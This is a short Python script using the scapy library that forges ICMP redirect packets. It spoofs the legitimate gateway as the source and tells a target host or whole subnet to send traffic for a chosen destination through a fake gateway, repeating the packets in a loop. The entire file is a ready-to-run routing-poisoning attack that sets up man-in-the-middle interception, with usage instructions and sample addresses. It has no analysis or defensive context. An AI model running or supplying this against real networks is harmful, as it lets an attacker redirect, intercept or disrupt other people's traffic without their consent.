import sys
from scapy.all import *

def icmpredirect(gw1,gw2,target,route,vb):
        packet = IP()/ICMP()
        packet[IP].src = gw1
	packet[IP].dst = target
        packet[ICMP].type = 5
	packet[ICMP].code = 1
	packet[ICMP].gw = gw2
	ip2 = IP()
	ip2.src = target
	ip2.dst = route
	packet2 = packet/ip2/UDP()
	srloop(packet2, verbose=vb)

if len(sys.argv) != 6:
    print "Usage: ICMP_redirect.py <legitimate_gw> <fake_gw> <target> <route> <verbose>\n  eg: ICMP_redirect.py 192.168.1.254 192.168.2.1 192.168.1.0/24 208.67.222.222 0"
    sys.exit(1)

icmpredirect(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], int(sys.argv[5]))
